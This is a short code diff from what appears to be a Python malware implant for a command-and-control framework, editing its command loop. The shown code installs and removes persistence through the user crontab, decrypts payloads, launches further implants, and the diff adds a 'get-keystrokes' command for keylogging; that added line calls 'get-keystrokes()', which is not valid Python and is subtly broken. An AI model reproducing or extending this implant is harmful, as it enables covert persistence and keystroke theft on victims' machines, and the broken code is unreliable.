@@ -79,7 +79,7 @@ def persist():
 def remove_persist():
   import subprocess as s
   s.call("crontab -l | { cat;  } | grep -v '_psh.sh'| crontab -", shell=True)
-  return "Removed persistence via user crontab" 
+  return "Removed user persistence via crontab, **must delete files manually**" 
 
 def decrypt_bytes_gzip( key, data):
   iv = data[0:16]
@@ -128,6 +128,8 @@ while(True):
             returnval = dfile(fname) 
           elif "install-persistence" in cmd:  
             returnval = persist() 
+          elif "get-keystrokes" in cmd:  
+            returnval = get-keystrokes()
           elif "remove-persistence" in cmd:  
             returnval = remove_persist() 
           elif cmd == "startanotherimplant":   
